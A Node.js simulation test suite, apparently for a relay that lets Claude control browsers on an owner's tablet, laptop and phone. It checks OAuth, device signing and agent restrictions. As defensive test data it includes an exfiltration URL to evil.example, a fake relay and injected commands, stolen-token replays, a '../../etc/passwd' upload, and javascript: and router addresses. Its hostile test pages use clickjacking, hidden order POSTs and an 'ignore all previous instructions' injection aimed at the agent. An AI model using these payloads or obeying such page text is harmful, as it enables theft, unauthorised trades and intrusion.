// Ronin Agent design v2 — protocol / state-machine simulation (NOT a real-device test: real Android WebView,
// WebView2 and real Cloudflare are in the device-test plan). Claude = an MCP client signed in with OAuth 2.1 + PKCE
// -> relay -> three Ronin devices (tablet, laptop, phone), each a real page engine behind its own WebSocket,
// with the helper loaded at document start as on Android. Run: NODE_PATH=$(npm root -g):./node_modules node simulate.js
const { chromium } = require('playwright');
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const { createRelay, sha } = require('./relay');
const { createDevice } = require('./device');
const AGENT = fs.readFileSync(path.join(__dirname, 'agent.js'), 'utf8');

const KEYS = {}; // filled at pairing: device key -> { name, public signing key }
const page = (f) => fs.readFileSync(path.join(__dirname, 'pages', f), 'utf8');
let pass = 0, fail = 0; const log = [];
const check = (ok, what) => { (ok ? pass++ : fail++); log.push((ok ? 'PASS ' : 'FAIL ') + what); console.error((ok ? 'PASS ' : 'FAIL ') + what); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

(async () => {
  let SKEW = 0; // test clock for the relay (to jump past the 120 s refresh grace)
  const relay = createRelay({ deviceKeys: KEYS, approveOn: ['tablet'], now: () => Date.now() + SKEW });
  await new Promise(r => relay.server.listen(0, r));
  const base = 'http://127.0.0.1:' + relay.server.address().port;
  // what the owner taps on his device when asked (the test decides)
  const answers = []; const approver = async (q) => { log.push('     owner sees: "' + q + '"'); return answers.length ? answers.shift() : false; };

  const browser = await chromium.launch();
  const SITES = { 'epds.example.gov.in/': 'election.html', 'web.dhan.co/': 'broker-login.html', 'web.dhan.co/positions': 'broker-positions.html',
    'protected.example.org/': 'challenge.html', 'protected.example.org/inside': 'inside.html', 'shop.example.com/': 'clickjack.html',
    'fees.example.in/': 'hindi-pay.html', 'verify.example.in/': 'otp.html', 'liar.example.com/': 'liar.html', 'bank.example.in/': 'ids.html', 'renew.example.com/': 'fetch-pay.html', 'news.example.com/': 'links.html' };
  const mk = async (name, key, kind, vp) => {
    const ctx = await browser.newContext({ viewport: vp, deviceScaleFactor: kind === 'laptop' ? 1 : 2 });
    await ctx.addInitScript({ content: AGENT }); // at document start, before the page's own scripts (Android addDocumentStartJavaScript)
    await ctx.route('**/*', (route) => { const u = new URL(route.request().url()); const f = SITES[u.host + u.pathname];
      return f ? route.fulfill({ contentType: 'text/html', body: page(f) }) : route.fulfill({ contentType: 'text/html', body: '<title>page</title><h1>' + u.pathname + '</h1>' }); });
    const p = await ctx.newPage();
    const d = createDevice({ name, url: base.replace('http', 'ws') + '/agent', key, page: p, kind, approver, relayPub: relay.relayPub });
    KEYS[key] = { name, pub: d.publicKey }; // pairing: the relay learns the device's public key, the device pins the relay's
    await d.connect(); await sleep(50); return d;
  };
  const tablet = await mk('tablet', 'tab-key-123', 'tablet', { width: 1280, height: 800 });
  const laptop = await mk('laptop', 'lap-key-456', 'laptop', { width: 1366, height: 768 });
  const phone = await mk('phone', 'pho-key-789', 'phone', { width: 412, height: 915 });
  const PEERS = { tablet: tablet.publicKey, laptop: laptop.publicKey, phone: phone.publicKey }; // learned at pairing
  for (const d of [tablet, laptop, phone]) d.setPeers(PEERS);

  // ---------- A. sign-in: OAuth 2.1 + PKCE, approved by the owner on his tablet ----------
  let rpc = 0, TOKEN = '';
  const mcpRaw = (method, params, tok = TOKEN) => fetch(base + '/mcp', { method: 'POST', headers: { 'content-type': 'application/json', authorization: 'Bearer ' + tok }, body: JSON.stringify({ jsonrpc: '2.0', id: ++rpc, method, params }) });
  check((await mcpRaw('tools/list', {}, '')).status === 401, 'A1 no token: 401 (the connector address alone opens nothing)');
  const reg = await (await fetch(base + '/register', { method: 'POST', body: JSON.stringify({ redirect_uris: ['https://claude.ai/api/mcp/auth_callback', 'https://claude.ai/other/path', 'https://evil.example/cb'] }) })).json();
  check(reg.redirect_uris.length === 1, 'A2 only Claude\'s EXACT return address is accepted (not other claude.ai paths, not other sites)');
  const verifier = crypto.randomBytes(32).toString('base64url');
  const auth = (v) => fetch(base + '/authorize?' + new URLSearchParams({ response_type: 'code', client_id: reg.client_id, redirect_uri: reg.redirect_uris[0], code_challenge: sha(v), code_challenge_method: 'S256', state: 's1' }), { redirect: 'manual' });
  answers.push(false); let a = await auth(verifier);
  check(/error=access_denied/.test(a.headers.get('location')), 'A3 owner taps "Deny" on the tablet: Claude is not connected');
  answers.push(true); a = await auth(verifier);
  const code = new URL(a.headers.get('location')).searchParams.get('code');
  const tok = (form) => fetch(base + '/token', { method: 'POST', body: new URLSearchParams(form) });
  check((await tok({ grant_type: 'authorization_code', code, client_id: reg.client_id, redirect_uri: reg.redirect_uris[0], code_verifier: 'wrong' })).status === 400, 'A4 a stolen code without the PKCE secret is useless');
  answers.push(true); a = await auth(verifier); const code2 = new URL(a.headers.get('location')).searchParams.get('code');
  let T = await (await tok({ grant_type: 'authorization_code', code: code2, client_id: reg.client_id, redirect_uri: reg.redirect_uris[0], code_verifier: verifier, resource: 'https://' + new URL(base).host + '/mcp' })).json();
  TOKEN = T.access_token; check(!!TOKEN && T.expires_in === 3600, 'A5 owner taps "Allow": 1-hour token + rotating refresh token');
  const T2 = await (await tok({ grant_type: 'refresh_token', refresh_token: T.refresh_token, client_id: reg.client_id })).json();
  const T2b = await (await tok({ grant_type: 'refresh_token', refresh_token: T.refresh_token, client_id: reg.client_id })).json();
  SKEW += 121_000; const late = (await tok({ grant_type: 'refresh_token', refresh_token: T.refresh_token, client_id: reg.client_id })).status;
  check(!!T2.access_token && T2b.access_token === T2.access_token && late === 400, 'A6 refresh rotates; a retry within 120 s gets the SAME pair (no logout on bad network), after that the old one is dead');
  const fresh = async () => { answers.push(true); const a3 = await auth(verifier); const c3 = new URL(a3.headers.get('location')).searchParams.get('code');
    return (await tok({ grant_type: 'authorization_code', code: c3, client_id: reg.client_id, redirect_uri: reg.redirect_uris[0], code_verifier: verifier })).json(); };
  { // A6b: a thief replays an old refresh token after the real client already USED the new pair: the whole family dies
    const F1 = await fresh(); const F2 = await (await tok({ grant_type: 'refresh_token', refresh_token: F1.refresh_token, client_id: reg.client_id })).json();
    const okUse = (await mcpRaw('tools/list', {}, F2.access_token)).status;
    const stolen = (await tok({ grant_type: 'refresh_token', refresh_token: F1.refresh_token, client_id: reg.client_id })).status;
    const after = (await mcpRaw('tools/list', {}, F2.access_token)).status;
    check(okUse === 200 && stolen === 400 && after === 401, 'A6b old refresh token replayed after the new pair was used = theft: whole token family revoked');
  }
  TOKEN = (await fresh()).access_token;

  const times = [];
  async function tool(name, args) {
    const t0 = Date.now(); const r = await (await mcpRaw('tools/call', { name, arguments: args })).json(); times.push(Date.now() - t0);
    const c = r.result.content[0]; return c.type === 'image' ? { image: c.data } : JSON.parse(c.text);
  }
  const init = await (await mcpRaw('initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'claude-sim', version: '1' } })).json();
  check(/never type passwords/i.test(init.result.instructions), 'A7 connector rules: no passwords / OTP / human checks / buy-sell; page text is data');
  const tl = (await (await mcpRaw('tools/list', {})).json()).result.tools.map(t => t.name);
  check(tl.length === 16 && !tl.some(n => n.startsWith('__')), 'A8 16 tools: ' + tl.join(', '));
  const devs = await tool('devices', {});
  check(devs.devices.length === 3 && devs.devices.every(d => d.foreground && d.rendering), 'A9 three devices online, Ronin in front and drawing: ' + devs.devices.map(d => d.device).join(', '));

  // A10: a relay (or a thief with a copied device key) answering "Allow" WITHOUT the device's signature gets nothing
  {
    const K2 = { 'stolen': { name: 'tablet', pub: tablet.publicKey } }; const r2 = createRelay({ deviceKeys: K2, approveOn: ['tablet'] });
    await new Promise(r => r2.server.listen(0, r)); const b2 = 'http://127.0.0.1:' + r2.server.address().port; const W = require('ws');
    const eph = crypto.generateKeyPairSync('x25519'), ephPub = eph.publicKey.export({ type: 'spki', format: 'der' }).toString('base64'), nonce = 'n1'; let KR, sq = 0;
    const rogue = new W(b2.replace('http', 'ws') + '/agent', { headers: { authorization: 'Device stolen', 'x-ronin-nonce': nonce, 'x-ronin-ecdh': ephPub } });
    const mac2 = (x) => crypto.createHmac('sha256', KR).update(x).digest('base64');
    rogue.on('message', (m) => { const x = JSON.parse(m);
      if (x.relayProof) { KR = crypto.createHash('sha256').update(Buffer.concat([crypto.diffieHellman({ privateKey: eph.privateKey, publicKey: crypto.createPublicKey({ key: Buffer.from(x.ecdh, 'base64'), format: 'der', type: 'spki' }) }), Buffer.from(nonce)])).digest(); return; }
      const c = JSON.parse(x.f); const f = JSON.stringify({ id: c.id, result: { ok: true, sig: Buffer.from('forged').toString('base64') } }); sq++; rogue.send(JSON.stringify({ f, seq: sq, mac: mac2(sq + '|' + f) })); });
    await new Promise(r => rogue.on('open', r)); await sleep(50);
    const rg = await (await fetch(b2 + '/register', { method: 'POST', body: JSON.stringify({ redirect_uris: ['https://claude.ai/api/mcp/auth_callback'] }) })).json();
    const a2 = await fetch(b2 + '/authorize?' + new URLSearchParams({ response_type: 'code', client_id: rg.client_id, redirect_uri: rg.redirect_uris[0], code_challenge: sha('v'), code_challenge_method: 'S256' }), { redirect: 'manual' });
    check(/access_denied/.test(a2.headers.get('location') || ''), 'A10 an "Allow" without a valid signature from the device\'s own hardware key is refused');
    let n429 = 0; for (let i = 0; i < 7; i++) if ((await fetch(b2 + '/register', { method: 'POST', body: '{}' })).status === 429) n429++;
    check(n429 >= 1, 'A11 flood of client registrations is slowed down (429)');
    rogue.close(); r2.server.close();
  }
  { // A12: a fake relay (DNS / certificate trick) sends a command: the device does nothing and hangs up
    const { WebSocketServer } = require('ws'); const fake = new WebSocketServer({ port: 0 }); const fctx = await browser.newContext(); const fp = await fctx.newPage();
    fake.on('connection', (w) => { w.send(JSON.stringify({ relayProof: Buffer.from('nope').toString('base64') })); w.send(JSON.stringify({ id: 'x1', tool: 'open', args: { url: 'https://evil.example/' } })); });
    const victim = createDevice({ name: 'tablet', url: 'ws://127.0.0.1:' + fake.address().port, key: 'k', page: fp, kind: 'tablet', approver, relayPub: relay.relayPub });
    await victim.connect(); await sleep(400);
    check(victim.st.events.some(e => e.type === 'fake relay') && !/evil/.test(fp.url()), 'A12 a fake relay is detected (pinned key) and its commands are ignored');
    victim.close(); fake.close(); await fctx.close();
  }

  { // A13: a frame pushed into the live connection without the session HMAC (MITM / injected command) is ignored
    relay.devices.get('tablet').ws.send(JSON.stringify({ f: JSON.stringify({ id: 'inj1', tool: 'open', args: { url: 'https://evil.example/' } }), seq: 9999, mac: 'AAAA' }));
    await sleep(300);
    check(tablet.st.events.some(e => e.type === 'bad frame') && !/evil/.test(tablet.owner.page.url()), 'A13 an injected command without the session HMAC is ignored');
    const prm = await (await fetch(base + '/.well-known/oauth-protected-resource')).json(); const h401 = (await mcpRaw('tools/list', {}, 'bad')).headers.get('www-authenticate') || '';
    const badRes = await fetch(base + '/authorize?' + new URLSearchParams({ response_type: 'code', client_id: reg.client_id, redirect_uri: reg.redirect_uris[0], code_challenge: sha('v'), code_challenge_method: 'S256', resource: 'https://other.example/mcp' }), { redirect: 'manual' });
    check(/\/mcp$/.test(prm.resource) && /oauth-protected-resource/.test(h401) && badRes.status === 400, 'A14 MCP auth discovery (RFC 9728 / 8414), 401 points to it; a token for another resource is refused');
  }

  let s;
  const ref = (re) => (s.elements.find(l => re.test(l)) || '').match(/\[(e\d+)\]/)?.[1];

  // ---------- B. election data entry on the tablet ----------
  await tool('open', { device: 'tablet', url: 'https://epds.example.gov.in/' });
  s = await tool('snapshot', { device: 'tablet' });
  check(/\[aadhaar-like hidden\]/.test(s.page_text_untrusted), 'B1 ID numbers on the page are hidden from Claude by default');
  answers.push(true); // first change on a new site: one tap "Allow on epds.example.gov.in"
  await tool('type', { device: 'tablet', ref: ref(/Employee name/), text: 'Ramesh Kumar' });
  check(tablet.st.events.some(e => e.type === 'approve' && /epds\.example\.gov\.in/.test(e.question)), 'B2 first form change on a new site asks the owner once');
  await tool('type', { device: 'tablet', ref: ref(/Employee ID/), text: 'UP12345' });
  let r = await tool('select', { device: 'tablet', ref: ref(/^\[e\d+\] select/), option: 'Assistant Teacher' });
  check(/chose "Assistant Teacher"/.test(r.done || ''), 'B3 dropdown chosen by its text');
  await tool('type', { device: 'tablet', ref: ref(/Mobile/), text: '9876543210' });
  r = await tool('upload', { device: 'tablet', ref: ref(/Upload photo/), file: 'teacher-photo.jpg' });
  check(/attached/.test(r.done || ''), 'B4 photo attached from "Ronin/For Claude" only');
  r = await tool('upload', { device: 'tablet', ref: ref(/Upload photo/), file: '../../etc/passwd' });
  check(!!r.error, 'B5 any other file is refused');
  tablet.st.dropAfter = 'click'; // the network breaks right after the Save tap, before the answer
  r = await tool('click', { device: 'tablet', ref: ref(/button "Save"/) });
  const saves = await tablet.owner.page.evaluate(() => window.saves);
  check(/tapped/.test(r.done || '') && saves === 1, 'B6 network break during Save: the command is sent again after reconnect, the form is saved ONCE (saves=' + saves + ')');
  s = await tool('snapshot', { device: 'tablet' });
  check(/Saved 1: Ramesh Kumar \/ Assistant Teacher \/ photo teacher-photo\.jpg/.test(s.page_text_untrusted), 'B7 form saved with name, designation and photo');
  tablet.owner.crashAfter('click'); // Ronin is killed right after the Save tap, before it could write "done"
  r = await tool('click', { device: 'tablet', ref: ref(/button "Save"/) });
  const saves2 = await tablet.owner.page.evaluate(() => window.saves);
  check(!!r.uncertain && saves2 === 2, 'B10 app killed during Save: Claude is told "uncertain, check the page", it is NOT pressed again (saves=' + saves2 + ')');
  r = await tool('click', { device: 'tablet', ref: ref(/button "Save"/) });
  check(/tap CHECKED/.test(r.error || ''), 'B11 after "uncertain", the same Save stays blocked until the owner taps CHECKED (no double entry via a new command)');
  tablet.owner.checked();
  const [c1, c2] = await Promise.all([tool('scroll', { device: 'tablet', direction: 'down' }), tool('scroll', { device: 'tablet', direction: 'up' })]);
  check(!!c1.done && !!c2.done, 'B8 two commands at once: done one after the other (one at a time per device)');
  answers.length = 0; r = await tool('open', { device: 'tablet', url: 'https://paste.example.com/?n=Ramesh' });
  check(/needs the owner/.test(r.error || ''), 'B9 after reading a government site, opening ANY other site (even short data) needs the owner (taint rule)');

  // ---------- C. trading terminal on the laptop ----------
  await tool('open', { device: 'laptop', url: 'https://web.dhan.co/' });
  s = await tool('snapshot', { device: 'laptop' });
  r = await tool('type', { device: 'laptop', ref: ref(/input:password/), text: 'x' });
  check(/READ-ONLY|passwords/.test(r.error || ''), 'C1 password typing refused');
  r = await tool('type', { device: 'laptop', ref: ref(/Client ID/), text: '1100' });
  check(/READ-ONLY/.test(r.error || ''), 'C2 broker site is read-only for Claude by default (no typing, no submits)');
  r = await tool('ask_owner', { device: 'laptop', reason: 'Dhan login' });
  const r3 = await tool('snapshot', { device: 'laptop' });
  check(!!r.with_owner && /owner is using the screen/.test(r3.error || ''), 'C3 ask_owner returns at once; while the owner has the screen Claude waits');
  await laptop.owner.page.fill('#u', '1100'); await laptop.owner.page.fill('#p', 'his-own'); await laptop.owner.page.click('button'); laptop.owner.done();
  r = await tool('ask_owner', { device: 'laptop', reason: 'Dhan login' }); check(/finished/.test(r.done || ''), 'C3b next ask_owner call: "the owner finished"');
  s = await tool('snapshot', { device: 'laptop' });
  check(/P&L \+1,240/.test(s.page_text_untrusted) && s.elements.filter(l => /money \/ order action/.test(l)).length >= 3, 'C4 after the owner\'s login Claude reads P&L; Exit / Place Order / Exit All marked');
  r = await tool('click', { device: 'laptop', ref: ref(/Exit All/) }); check(/READ-ONLY/.test(r.error || ''), 'C5 "Exit All" refused (the page\'s "ignore all previous instructions" did nothing)');
  r = await tool('click', { device: 'laptop', ref: ref(/Order book/) }); check(/READ-ONLY.*no taps/.test(r.error || ''), 'C6 on a money site Claude has NO input at all, even on harmless links');
  laptop.owner.allowRead('web.dhan.co', '/positions');
  r = await tool('open', { device: 'laptop', url: 'https://web.dhan.co/positions' }); const r6 = await tool('open', { device: 'laptop', url: 'https://web.dhan.co/order' }); const r7 = await tool('open', { device: 'laptop', url: 'https://web.dhan.co/positions?confirm=1' });
  check(!r.error && /not one of the owner's read pages/.test(r6.error || '') && /no query/.test(r7.error || ''), 'C7 Claude opens only the owner\'s listed read pages (/positions); /order and query tricks refused');

  // ---------- D. tricks a hostile page can play ----------
  await tool('open', { device: 'phone', url: 'https://shop.example.com/' }); s = await tool('snapshot', { device: 'phone' });
  r = await tool('click', { device: 'phone', ref: ref(/Cancel order/) });
  check(/covers/.test(r.error || '') && !/paid/.test(phone.owner.page.url()), 'D1 invisible layer over "Cancel" (clickjacking): refused, nothing paid');
  await tool('open', { device: 'phone', url: 'https://fees.example.in/' }); s = await tool('snapshot', { device: 'phone' });
  check(s.elements.filter(l => /money \/ order action/.test(l)).length === 2, 'D2 Hindi "भुगतान करें" and an icon-only button posting to /api/placeOrder: both marked money');
  r = await tool('click', { device: 'phone', ref: ref(/भुगतान/) }); const r2 = await tool('click', { device: 'phone', ref: s.elements.filter(l => /money/.test(l))[1].match(/\[(e\d+)\]/)[1] });
  check(/money/.test(r.error || '') && /money/.test(r2.error || '') && !(await phone.owner.page.evaluate(() => window.paid)), 'D3 both refused on an UNKNOWN site; nothing paid');
  answers.push(true); r = await tool('type', { device: 'phone', ref: ref(/Search fee type/), text: 'exam', submit: true });
  check(await phone.owner.page.evaluate(() => window.searched === 1), 'D4 ordinary search on that site still works (after one "Allow")');
  await tool('open', { device: 'phone', url: 'https://verify.example.in/' }); s = await tool('snapshot', { device: 'phone' });
  check(s.elements.filter(l => /OTP: the owner types it/.test(l)).length >= 8, 'D5 OTP boxes found by shape (one-time-code, 6-digit numeric "PIN code"), not by name only');
  r = await tool('type', { device: 'phone', ref: ref(/Enter code/), text: '123456' }); check(/OTP box/.test(r.error || ''), 'D6 typing into them refused');
  r = await tool('type', { device: 'phone', ref: ref(/Remarks/), text: '482913' });
  const r6c = r; phone.owner.allowDigits('verify.example.in', 'Remarks'); answers.length = 0; answers.push(true);
  r = await tool('type', { device: 'phone', ref: ref(/Remarks/), text: '482913' });
  check(/looks like an OTP/.test(r6c.error || '') && /typed/.test(r.done || ''), 'D6c 4-8 digits into an ordinary box look like an OTP: refused, until the owner allows digits in that exact field');
  r = await tool('type', { device: 'phone', ref: ref(/Digit 1/), text: '4' }); const rsp = await tool('type', { device: 'phone', ref: ref(/Remarks2/), text: '48 29-13' });
  check(/OTP box/.test(r.error || '') && /looks like an OTP/.test(rsp.error || ''), 'D6d a split 6-box OTP is one secret field; "48 29-13" with spaces/dashes is still caught');
  r = await tool('type', { device: 'phone', ref: ref(/Portal password/), text: 'x' }); check(/only the owner types passwords/.test(r.error || ''), 'D6b password box on an ordinary site: refused too');
  await tool('open', { device: 'phone', url: 'https://liar.example.com/' }); s = await tool('snapshot', { device: 'phone' });
  check(s.elements.some(l => /Pay now.*money/.test(l)), 'D7 a page that rewrites browser functions to lie cannot fool the helper (captured at document start): "Pay now" seen and marked');
  answers.length = 0; r = await tool('open', { device: 'phone', url: 'https://evil.example/collect?d=' + 'A'.repeat(300) }); // owner does not allow
  check(/needs the owner/.test(r.error || ''), 'D8 sending data to a new site in the address needs the owner (refused)');
  r = await tool('open', { device: 'phone', url: 'http://192.168.1.1/admin' }); check(/never opened/.test(r.error || ''), 'D9b home-router / server addresses are never opened');
  r = await tool('open', { device: 'phone', url: 'javascript:alert(1)' }); check(/not allowed/.test(r.error || ''), 'D9 javascript: / file: / intent: addresses refused');
  r = await tool('type', { device: 'phone', ref: 'e1', text: 'x'.repeat(2500) }); check(/too much text/.test(r.error || ''), 'D10 more than 2000 characters at once refused');
  await tool('open', { device: 'phone', url: 'https://bank.example.in/' }); s = await tool('snapshot', { device: 'phone' });
  log.push('     Claude reads: ' + s.page_text_untrusted.replace(/\s+/g, ' ').slice(0, 120));
  check(!/1234 5678 9012|ABCDE1234F|123456789012/.test(s.page_text_untrusted) && /PAN hidden/.test(s.page_text_untrusted) && /Rs 5,000/.test(s.page_text_untrusted), 'D11 Aadhaar / PAN / account number hidden, the balance still readable');
  r = await tool('get_text', { device: 'phone', ref: ref(/Statement for/) });
  check(/hidden/.test(r.text || '') && !/123456789012/.test(r.text || ''), 'D12 get_text goes through the same ID filter: "' + (r.text || r.error) + '"');
  answers.length = 0; await tool('click', { device: 'phone', ref: ref(/Download report/) }); await sleep(300);
  r = await tool('downloads', { device: 'phone' });
  check(r.downloads.length === 1 && /blocked/.test(r.downloads[0].state), 'D13 a download needs the owner\'s Allow (denied here: ' + (r.downloads[0] || {}).state + ')');
  answers.length = 0; r = await tool('screenshot', { device: 'phone' });
  check(/did not allow/.test(r.error || ''), 'D14 screenshot of a bank / government page needs the owner (pixels cannot be redacted)');
  answers.length = 0; answers.push(true); // leaving the bank page after reading it: owner allows renew.example.com
  await tool('open', { device: 'phone', url: 'https://renew.example.com/' }); s = await tool('snapshot', { device: 'phone' });
  check(!s.elements.some(l => /Continue.*money/.test(l)), 'D15 (the trap) "Continue" looks harmless: no money word, no form');
  answers.length = 0; r = await tool('click', { device: 'phone', ref: ref(/Continue/) });
  check(/read-only for Claude until the owner adds it/.test(r.error || ''), 'D15b an UNKNOWN site is read-only: even a plain-looking button needs the owner to add the site');
  answers.length = 0; answers.push(true); r = await tool('click', { device: 'phone', ref: ref(/Continue/) });
  check(/BLOCKED/.test(r.error || '') && !(await phone.owner.page.evaluate(() => window.paid)), 'D16 ...but its hidden POST /api/v2/placeOrder is blocked at the network layer: ' + (r.error || '').slice(0, 90));
  r = await tool('click', { device: 'phone', ref: ref(/Next step/) });
  check(/BLOCKED/.test(r.error || '') && !/order/.test(phone.owner.page.url()), 'D17 a plain link to /order?confirm=1 is blocked too');
  r = await tool('click', { device: 'phone', ref: ref(/Save note/) }); await sleep(200);
  log.push('     ' + JSON.stringify(r)); check(!r.error && (await phone.owner.page.evaluate(() => window.noted === 1)), 'D18 an ordinary POST (save a note) still works');
  const b0 = phone.st.blocked.length; await tool('click', { device: 'phone', ref: ref(/Later/) }); await sleep(3600);
  check(!(await phone.owner.page.evaluate(() => window.paid2)) && phone.st.blocked.slice(b0).some(x => /placeOrder/.test(x)), 'D19 an order fired by a 3-second timer AFTER Claude\'s tap is still blocked');

  // ---------- E. human checks ----------
  answers.length = 0; answers.push(true); r = await tool('open', { device: 'tablet', url: 'https://protected.example.org/' }); s = await tool('snapshot', { device: 'tablet' });
  r = await tool('click', { device: 'tablet', ref: ref(/Verify you are human/) }); check(/does not solve human checks/.test(r.error || ''), 'E1 Claude ticking a human check refused');
  await tool('ask_owner', { device: 'tablet', reason: 'please tick the check' });
  await tablet.owner.page.click('#cb'); await tablet.owner.page.waitForURL('**/inside'); tablet.owner.done(); await tool('ask_owner', { device: 'tablet', reason: 'wait' });
  s = await tool('snapshot', { device: 'tablet' }); check(/the check passed/.test(s.page_text_untrusted), 'E2 owner ticks it, Claude continues inside');
  answers.length = 0; answers.push(true);
  await tool('open', { device: 'phone', url: 'https://protected.example.org/' }); await tool('open', { device: 'phone', url: 'https://protected.example.org/' });
  r = await tool('open', { device: 'phone', url: 'https://protected.example.org/' });
  check(/3 times in 10 minutes: stopping/.test(r.error || ''), 'E3 the same check 3 times: Claude stops and tells the owner (no endless loop)');

  // ---------- F. owner in control ----------
  phone.owner.touch(); await sleep(1600); r = await tool('snapshot', { device: 'phone' }); check(/RESUME/.test(r.error || ''), 'F1 owner touches the screen: Claude pauses and STAYS paused (no silent auto-resume)');
  phone.owner.resumeClaude(); r = await tool('snapshot', { device: 'phone' }); check(!r.error, 'F2 ...and continues only after he taps RESUME');
  phone.tell({ stopDevice: 'tablet' }); await sleep(300); r = await tool('snapshot', { device: 'tablet' });
  check(/pressed STOP/.test(r.error || ''), 'F3 "Stop Claude on the tablet" pressed on the PHONE works');
  laptop.owner.setAccess(false); r = await tool('snapshot', { device: 'laptop' }); check(/access is OFF/.test(r.error || ''), 'F4 access switch OFF on a device'); laptop.owner.setAccess(true);
  const shot = await tool('screenshot', { device: 'phone' }); check(shot.image && shot.image.length > 3000, 'F5 screenshot (' + Math.round(shot.image.length * 0.75 / 1024) + ' KB)');
  check(!JSON.stringify(relay.audit).includes('Ramesh') && !JSON.stringify(relay.audit).includes('P&L'), 'F6 relay audit keeps tool names / sites only, never page text or typed text');
  phone.drop(); phone.owner.stopAll(); await sleep(900); // network down, owner presses Stop on the phone itself
  r = await tool('snapshot', { device: 'phone' }); check(/pressed STOP/.test(r.error || ''), 'F9 Stop pressed while the network was DOWN still holds (local flag, needs no relay)'); phone.owner.resume();
  const n0 = laptop.st.count; laptop.owner.setBudget(n0 + 1); await tool('scroll', { device: 'laptop', direction: 'down' }); r = await tool('scroll', { device: 'laptop', direction: 'down' });
  check(/daily limit/.test(r.error || ''), 'F10 daily action limit per device stops a looping agent'); laptop.owner.setBudget(2000);
  { // links on an unknown site: plain links yes; action links (query / unsubscribe...) need the owner; script links never
    answers.length = 0; answers.push(true); await tool('open', { device: 'phone', url: 'https://news.example.com/' }); s = await tool('snapshot', { device: 'phone' }); answers.length = 0;
    const la = await tool('click', { device: 'phone', ref: ref(/Unsubscribe me/) }), lj = await tool('click', { device: 'phone', ref: ref(/Read more/) }), lp = await tool('click', { device: 'phone', ref: ref(/About us/) });
    check(/read-only for Claude until the owner adds it/.test(la.error || '') && /script link/.test(lj.error || '') && /tapped/.test(lp.done || ''), 'D20 unknown site: "Unsubscribe?u=77" link needs the owner, a javascript: link is refused, a plain link works');
    await tool('open', { device: 'phone', url: 'https://news.example.com/' }); s = await tool('snapshot', { device: 'phone' });
    const ls = await tool('click', { device: 'phone', ref: ref(/Search update drivers/) });
    check(/tapped/.test(ls.done || ''), 'D20b an ordinary search link (?q=update+drivers) does not cost the owner a tap');
  }
  { // the signed grant has a 12-hour life on the device, and a clock moved backwards stops Claude
    phone.st.skew = 13 * 3600_000; const e1 = await tool('snapshot', { device: 'phone' }); phone.st.skew = 0;
    const keep = phone.st.lastSeen; phone.st.lastSeen = Date.now() + 2 * 3600_000; const e2 = await tool('snapshot', { device: 'phone' }); phone.st.lastSeen = keep;
    check(/older than 12 hours/.test(e1.error || '') && /clock went backwards/.test(e2.error || ''), 'F16 a grant older than 12 h is refused on the device (max delay if a "Disconnect" is hidden); a clock moved back stops Claude');
  }
  const okChain = tablet.verifyLog() && relay.checkChain('tablet', tablet.st.log); tablet.st.log[2].tool = 'snapshot'; const broken = !tablet.verifyLog();
  check(okChain && broken, 'F11 "what Claude did" list is hash-chained: ' + tablet.st.log.length + ' lines verify, a changed line is detected');
  { // a cleverer attacker rewrites the WHOLE chain so it verifies again: the heads kept by the relay no longer match
    const H = (x) => crypto.createHash('sha256').update(x).digest('hex'); let prev = 'start';
    for (const l of tablet.st.log) { const { hash, ...e } = l; l.hash = H(prev + JSON.stringify(e)); prev = l.hash; }
    check(tablet.verifyLog() && !relay.checkChain('tablet', tablet.st.log), 'F11b a fully rewritten list is caught by the heads the relay kept (' + (relay.anchors.get('tablet') || []).length + ' anchors)');
  }
  check(relay.tokenDevices().every(d => d === 'tablet'), 'F12 every Claude token is bound to the device that approved it (tablet)');
  relay.revokeDevice('laptop'); await sleep(200);
  const dl = (await tool('devices', {})).devices.map(d => d.device);
  check(!dl.includes('laptop') && (await mcpRaw('tools/list', {})).status === 200, 'F13 owner removes the laptop: it is gone, Claude keeps working on the others');
  const oldGrant = relay._grantOf();
  phone.owner.disconnectClaude(); await sleep(400);
  check((await mcpRaw('tools/list', {})).status === 401, 'F7 "Disconnect Claude" on a device: all tokens dead at once');
  r = await relay._call('snapshot', { device: 'tablet' }, 'claude', oldGrant); // a hacked relay keeps using the old grant
  check(/no valid owner grant/.test(r.error || '') && tablet.st.epoch === 1, 'F7b ...and even a hacked relay replaying the old grant is refused by the devices (new signed epoch)');
  const stranger = await new Promise(res => { const W = require('ws'); const w = new W(base.replace('http', 'ws') + '/agent', { headers: { authorization: 'Device guess' } }); w.on('close', c => res(c)); w.on('error', () => {}); });
  check(stranger === 4001, 'F8 an unpaired device is refused');

  const avg = Math.round(times.reduce((x, y) => x + y, 0) / times.length);
  log.push(`speed (local, not a phone on mobile data): ${times.length} actions, average ${avg} ms`);
  console.log(log.join('\n')); console.log(`\n${pass} passed, ${fail} failed`);
  fs.writeFileSync(path.join(__dirname, 'simulation-result.txt'), log.join('\n') + `\n\n${pass} passed, ${fail} failed\n`);
  await browser.close(); relay.server.close(); process.exit(fail ? 1 : 0);
})().catch(e => { console.error(e); process.exit(2); });
